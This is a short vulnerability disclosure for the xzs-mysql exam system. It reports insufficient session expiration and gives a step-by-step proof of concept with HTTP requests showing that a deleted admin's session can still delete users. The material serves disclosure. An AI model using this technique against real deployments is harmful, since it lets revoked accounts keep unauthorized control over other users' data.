## TYPE: Insufficient Session Expiration(CWE-613)

## Date: 3/13/2024
## Vendor
[mindskip](https://github.com/mindskip)
Homepage: https://github.com/mindskip/xzs-mysql
version: 3.8(updated 7/19/2022)
commit: 189b03f63bef4e2bfeba7003512860283ee27605(updated 3/8/2024)
## Tested on: Debian Linux, Mysql

## Exploit Description
Suffering from CWE613-Insufficient Session Expiration, which allows attackers to use the session of a deleted admin to do anything.
### PoC
1. `admin` login
2. `admin` create another admin named `sub-admin`
```
POST 	/api/admin/user/edit HTTP/1.1
{"id":null,"userName":"sub-admin","password":"123456"...}
```
3. `sub-admin` logged in 
4. `admin` delete `sub-admin`
```
POST /api/admin/user/delete/12 HTTP/1.1
```
5. `sub-admin` can still delete students
```
POST /api/admin/user/delete/15 HTTP/1.1
...
response: 
HTTP/1.1 200 OK
{"code":1,"message":"成功","response":null}
```
